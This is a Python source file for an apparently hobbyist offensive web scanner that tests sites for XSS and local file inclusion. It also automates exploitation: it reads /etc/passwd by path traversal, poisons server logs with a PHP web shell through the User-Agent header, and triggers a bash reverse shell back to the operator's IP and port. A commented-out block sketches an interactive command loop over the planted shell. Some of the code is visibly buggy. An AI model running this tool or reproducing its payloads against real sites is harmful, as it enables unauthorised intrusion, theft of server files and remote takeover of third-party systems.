# ---------------------------------- # Libs
import argparse
import os
import sys
import requests
import re
# ---------------------------------- # Froms
from colorama import Fore, Style
from pprint import pprint
from random import randint
from asciistuff import Lolcat
from time import sleep
from requests.api import head
from requests.models import ProtocolError
from user_agent import error, generate_user_agent
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup as bsp
from html.parser import HTMLParser
# ---------------------------------- # Args Parsing

parser = argparse.ArgumentParser(description="WebFlaws-Scanner made by Rennaarenata")
parser.add_argument("-u", "--site", help="The site to analyze and search for security flaws")
parser.add_argument("-c", "--custom", help="Use this option if you want to use a custom payload to test", default="<script>alert(1)</script>")
parser.add_argument("-wl", "--wordlist", help="Use this option if you want to use a wordlist of payloads to test", default=None)
parser.add_argument("-m", "--mode", help="Choose whether the program should scan for XSS, LFI, ORD(Open Redirect) vulnerabilities", default=None)

args = parser.parse_args()
site = args.site
mode = args.mode
custom = args.custom
wordlist = args.wordlist

# ---------------------------------- # Variables

inputs = []
dirs = []
vulninputs = []
inputs_set = set(inputs)
forms = []
ExtLinks = []
oLinks = []
IntLinks = []
sLinks = []

# ---.------------------------------ # Functions
#    +--------------------- # XSS
def search_inputs_links(site):
	try:
		user_agent = generate_user_agent()
		headers = {
			"User-Agent" : user_agent
		}
		r = requests.get(str(site), headers=headers)
		content = r.text
		soup = bsp(content, "html5lib")
		scrape_links = soup.find_all("input")
		for i in scrape_links:
			try:
				inputs.append(i['name'])
				pass
			except KeyError:
				pass
	except requests.exceptions.ConnectionError:
			pass

def find_dirs(site):
    try:
        useragent = generate_user_agent()
        headers = {
            "User-Agent": useragent
        }
        response = requests.get(site, headers=headers)
        content = response.text
        zuppa = bsp(content, "html5lib")
        scrape = zuppa.find_all("a")
        for i in scrape:
            try:
                if(i['href'][0] == '/' and i['href'][-1] == '/' and i['href'].startswith("//") == False and i['href'].endswith("//") == False):
                    dirs.append(i['href'])
                else:
                    pass
            except IndexError:
                pass
            except KeyError:
                pass
    except requests.exceptions.ConnectionError:
        pass

def find_links(sites):
	user_agent = generate_user_agent()
	headers = {
		"User-Agent" : user_agent
	}
	response = requests.get(sites, headers=headers)
	content = response.text
	soup = bsp(content, "html5lib")
	scrape_links = soup.find_all("a")
	for i in scrape_links:
           try:
               if(sites in i['href']):
                   IntLinks.append(i['href'])
                   pass
               if(i['href'][0] != "/" and i['href'][-1] == "/" and i['href'].startswith("https") == False and i['href'].startswith("http") == False):
                   sLinks.append(i['href'])
                   pass
               if(i['href'].startswith("//") == False and i['href'][0] == "/" and i['href'][-1] != "/" and i['href'].startswith("http") == False and i['href'].startswith("https") == False and i['href'].startswith("www.") == False and i['href'].startswith("mailto") == False):
                   IntLinks.append(i['href'])
                   pass
               if(i['href'].startswith("/") == False and i['href'].endswith("/") == False and i['href'].startswith("https") == False and i['href'].startswith("http") == False):
                   ExtLinks.append(i['href'])
                   pass
               else:
                   pass
           except IndexError or KeyError or requests.ConnectionError:
               pass


def getforms(sitem):
    zuppetta = bsp(requests.get(sitem).content, "html.parser")
    return zuppetta.find_all("form")

def details(forms):
    detailsf = {}
    
    action = forms.attrs.get("action")
    method = forms.attrs.get("method", "get").lower()    
    inputs = []

    for input_tag in forms.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    detailsf["action"] = action
    detailsf["method"] = method
    detailsf["inputs"] = inputs

    return detailsf

def submitf(form_details, url, val):
    
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if(input["type"] == "text" or input["type"] == "search"):
            input["value"] = val
        input_name = input.get("name")
        input_value = input.get("value")
        if(input_name and input_value):
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scanx(url, jscrpt, ismain):
  
    if(jscrpt == None):
        jscrpt = "<script>alert(1)</script>"
    isv = False
    for form in forms:
        form_details = details(form)
        content = submitf(form_details, url, jscrpt).content.decode()
        if(jscrpt in content):
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[!] GOOD NEWS BOI!" + Fore.BLUE + Style.BRIGHT + " XSS FOUND ON " + Fore.LIGHTGREEN_EX+ Style.BRIGHT + f"{url}")
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[i]: Here you go, form details:\n " + Fore.RED + Style.BRIGHT)
                pprint(form_details)
                print(Fore.RESET)
                isv = True
                if(ismain == "Yes"):
                    ismain = "mainvuln"
                    return ismain
                return isv

    return isv
# ------------------------- # LFI

def doit(whattotest, howdeeeep, deeparam, check):
    newstr = whattotest + (deeparam * howdeeeep) + check
    print("doit: ", newstr)
    return newstr

def checkforvuln(string):
    check1 = "root:x:0:0:"
    check2 = "mail:x:8:"
    cc = requests.get(string)
    content = cc.content.decode()
    if check1 in content or check2 in content:
        a = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[!!] LFI FOUND!\n[+] Vulnerable Link: " + Fore.MAGENTA + Style.BRIGHT + f"{string}" + Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Content:\n {content}\n[+] Creating a log file...")
        
        log = open("log.txt", 'w')
        log.write(f"[LFI FOUND]\n----------------{string}------------------ Content\n" + content)
        log.close()
        print(a)
        sleep(4)
        aa = True
        return aa
# ------------------ # N. funcs

def bye(): # Exit 
    msg9 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[^] Glad to help, bye!!")
    for char in msg9:
        sleep(0.04)
        sys.stdout.write(char)
        sys.stdout.flush()
    exit()

def say(message):
    for char in message:
        sleep(0.04)
        sys.stdout.write(char)
        sys.stdout.flush()

def bannerh():     
    if(sys.platform == "win32"):
        os.system("cls")
    if(sys.platform == "linux" or sys.platform == "linux2"):
        os.system("clear")

    banner = """
    @@@  @@@  @@@  @@@  @@@       @@@  @@@  @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@     @@@  @@@         @@@  @@@@@@@  @@@  @@@@@@    @@@@@@      @@@@@@@   @@@@@@@     @@@  @@@       @@@       @@@@@@   @@@@@@@   
    @@@  @@@  @@@  @@@  @@@       @@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@   @@@@  @@@        @@@@  @@@@@@@  @@@  @@@@@@@  @@@@@@@      @@@@@@@@  @@@@@@@@   @@@@  @@@       @@@       @@@@@@@  @@@@@@@@  
    @@!  @@@  @@!  @@@  @@!       @@!@!@@@  @@!       @@!  @@@  @@!  @@@  @@!  @@@  @@@!!  @@!       @@@!!    @@!    @@!      @@@  !@@          @@!  @@@  @@!  @@@  @@@!!  @@!       @@!           @@@  @@!  @@@  
    !@!  @!@  !@!  @!@  !@!       !@!!@!@!  !@!       !@!  @!@  !@!  @!@  !@   @!@    !@!  !@!         !@!    !@!    !@!      @!@  !@!          !@!  @!@  !@!  @!@    !@!  !@!       !@!           @!@  !@!  @!@  
    @!@  !@!  @!@  !@!  @!!       @!@ !!@!  @!!!:!    @!@!!@!   @!@!@!@!  @!@!@!@     @!@  @!!         @!@    @!!    !!@  @!@!!@   !!@@!!       @!@  !@!  @!@!!@!     @!@  @!!       @!!       @!@!!@   @!@!!@!   
    !@!  !!!  !@!  !!!  !!!       !@!  !!!  !!!!!:    !!@!@!    !!!@!!!!  !!!@!!!!    !@!  !!!         !@!    !!!    !!!  !!@!@!    !!@!!!      !@!  !!!  !!@!@!      !@!  !!!       !!!       !!@!@!   !!@!@!    
    :!:  !!:  !!:  !!!  !!:       !!:  !!!  !!:       !!: :!!   !!:  !!!  !!:  !!!    !!:  !!:         !!:    !!:    !!:      !!:       !:!     !!:  !!!  !!: :!!     !!:  !!:       !!:           !!:  !!: :!!   
     ::!!:!   :!:  !:!   :!:      :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!    :!:   :!:        :!:    :!:    :!:      :!:      !:!      :!:  !:!  :!:  !:!    :!:   :!:       :!:          :!:  :!:  !:!  
      ::::    ::::: ::   :: ::::   ::   ::   :: ::::  ::   :::  ::   :::   :: ::::    :::   :: ::::    :::     ::     ::  :: ::::  :::: ::       :::: ::  ::   :::    :::   :: ::::   :: ::::  :: ::::  ::   :::  
        :       : :  :   : :: : :  ::    :   : :: ::    :   : :   :   : :  :: : ::      ::  : :: : :     ::     :     :     : : :   :: : :       :: :  :    :   : :     ::  : :: : :  : :: : :   : : :    :   : :                                                                                                                                                                                                                                                                                                                                                        
    """
    print(str(Lolcat(banner)))

# ---------------------------------- # MainEx
# ------------------- # Args check

if(mode == None or site == None):
    Warn = ("[?] Define all required parameters (mode & site at least)")
    say(Warn)
    exit()

bannerh()

# ------------------- # Checks & Execute 
if (mode == "XSS" or mode == "Xss" or mode == "xss"):
    fnntng = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[i] Scanning " + Fore.MAGENTA + f"{site}" + Fore.LIGHTGREEN_EX)
    say(message=fnntng)

    find_dirs(site=site)
    forms = getforms(sitem=site)
         
    mlgf = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[+] Found " + Fore.MAGENTA + Style.BRIGHT + f"{len(forms)}" + Fore.LIGHTGREEN_EX + Style.BRIGHT +" form(s) in the main page..." + Fore.RED + Style.BRIGHT + "\n")
    say(message=mlgf)

    msg1 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[i] Searching for directories...")
    say(message=msg1)

    ms2 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[+] Found " + Fore.MAGENTA + f"{str(len(dirs))}" + Fore.LIGHTGREEN_EX + " directories:")
    say(message=ms2)
    for i in range(200):
        try:
            msg2 = (Fore.BLUE + Style.BRIGHT + f"\n>> {dirs[i]}")
            say(message=msg2)
                  
            if(i == 10):
                    a = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[?] Do you want to continue? (y/n): ")
                    if(a == 'y'):  
                        msg4 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[i] Ok...")   
                        say(message=msg4)
                        continue
                    else:
                        msg4 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[i] Ok, let's go ahead...")
                        say(message=msg4)
                        break
        except IndexError:
                pass
            
    zerodir = False

    msss = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Searching for links...")
    say(message=msss)
    find_links(sites=site)
    tot_links = ExtLinks + IntLinks + sLinks + oLinks
    mssss = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[+] Found " + Fore.MAGENTA + Style.BRIGHT + str(len(tot_links)) + Fore.LIGHTGREEN_EX + Style.BRIGHT + " links")
    say(message=mssss)


    if(len(dirs) == 0):
            zerodir = True

    if(zerodir == False):
            msg5 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Searching for forms in all directories...")
            say(message=msg5)
            msg6 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Testing the main page...")
            say(message=msg6)
            l = False         

    if(scanx(site, custom, True) == "mainvuln" and zerodir == False):
        msg7 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[?] Do you want to test directories? (y/n): ")
        say(message=msg7)
        p = input()
        if(p == 'y'):
            pass 
        else:
            bye()
    
    
    if(zerodir == False):
        msg7 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Testing all the directories...")
        say(message=msg7)
        a = 0
    
    if(wordlist == None):
            for i in range(int(len(dirs))):
                sitem = site + dirs[int(i)]
                forms = getforms(sitem=sitem)
                if(scanx(sitem, custom, False) == False):
                        msg8 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[@] Nothing in \"{dirs[int(i)]}\" Try checking manually...")
                        say(message=msg8)
                        if(i % 5 == 0):
                            ss = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[?] Continue? (y/n): ")
                            if(ss == 'y'):
                                continue
                            else:
                                msg00 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "[i] Ok...")
                                say(message=msg00)
                                bye()
    if(wordlist != None):
            with open(wordlist, 'r') as f:
                find_dirs(site=site)
                for line in f:
                    for i in range(int(len(dirs))):
                        sitem = site + dirs[int(i)]
                        getforms(sitem=sitem)
                        if(scanx(sitem, line, False) == False):
                            msg8 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[@] Nothing in \"{sitem}\" Try checking manually... Payload {a} - {line}")
                            say(message=msg8)
                            if(i % 5 == 0):
                                ss = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[?] Continue? (y/n): ")
                                if(ss == 'y'):
                                    continue
                                else:
                                    msg00 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "[i] Ok...")
                                    say(message=msg00)
                                    bye()


if(mode == "LFI" or mode == "Lfi" or mode == "lfi"):
    max_file_depth = 20
    more_depthness = "../"
    user_agent = generate_user_agent()
    nullbyte = "%00"
    testfile = "/etc/passwd"
    check1 = "root:x:0:0:"

    if(site.endswith('=') != True):
        ms = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "[!] Please insert a valid url (e.g. https://www.site.com/file.php?parameter= or https://www.site.com/lol?something= )")
        say(ms)
        exit()

    cc = ""
    statuscode = 0
    testthis = site + testfile
    cc = requests.get(testthis)
    statuscode = cc.status_code
    newstra = ""

    am = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[*] Analyzing" + Fore.MAGENTA + Style.BRIGHT +  f" {site} \n")
    say(am)
    
    if(statuscode == 500 or statuscode == 404 or statuscode == 503):
        for i in range(int(max_file_depth)):
                newstra = doit(testthis, i, more_depthness, check1)
                testthis=newstra
    
    if(checkforvuln(testthis) == True):
        vfm = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Do you want to exploit this LFI?[y/n] (LFI -> RCE): ")
        say(vfm)
        choice = input()
        if(choice == "Y" or choice == "y"):
            wlr = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Insert a log wordlist: ")
            say(wlr)
            wordl = input()
            ipr = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Insert your IP address: ")
            say(ipr)
            ip = input()
            pr = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Insert a port: ")
            say(pr)
            port = input()
            if(wordl != None and ip != None and port != None):
                lg = open(wordl)
                logfiles = lg.read().split()
                ms1 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Starting log crawler against: " + Fore.MAGENTA + Style.BRIGHT + f"{site}")
                say(ms1)
                for logfile in logfiles:
                        check = requests.get(site + logfile)
                        if check.status_code == 200: 
                            assdsa = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[!] Found this log file:" + Fore.MAGENTA + Style.BRIGHT + f" {logfile}")
                            say(assdsa)
                            lok = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[+] Injecting PHP code to trigger RCE...\n")
                            say(lok)
                            h = {
                                "User-Agent" : "Mozilla/5.0 <?php system($_GET['qwertyop']); ?> Firefox/70.0"
                            } 
                            requests.get(site + logfile, headers=h)
                            succ = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[!] Code injected successfully (rce parameter: qwertyop)\n")
                            say(succ)
                            #---------  fare rev shell, listener netcat
                            revshell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
                            requests.get(site + logfile + f"&qwertyop={revshell}")

                        else:
                            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + f"[@] I didn't found any injectable log file...\n[@] Exiting...")
                            exit()
            else:
                say("Exiting...")
                exit()
    else:
        s = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[@] The target seems to be not vulnerable.")
        say(s)



# TODO: fix LFI algorithm, usa la machine (già accesa) da thm RITARDATO


"""
                            while True:
                                cmd = input(Fore.LIGHTBLUE_EX + Style.BRIGHT + "Enter a command to execute:\n>> " + Fore.LIGHTGREEN_EX + Style.BRIGHT)
                                file = "t3mp"
                                if(cmd == "exit"):
                                    exit()
                                requests.get(site + logfile + f"&qwertyop=" + cmd + "> /tmp/" + str(file) + ".txt")
                                output = requests.get(site + "../../../../../../../../../../../../../../../../../../tmp/" + str(file) + ".txt")
                                postpt = (Fore.LIGHTBLUE_EX + Style.BRIGHT + f"Possible command output:" + Fore.RED + Style.BRIGHT +  f"\n{}")
                                say(postpt)
"""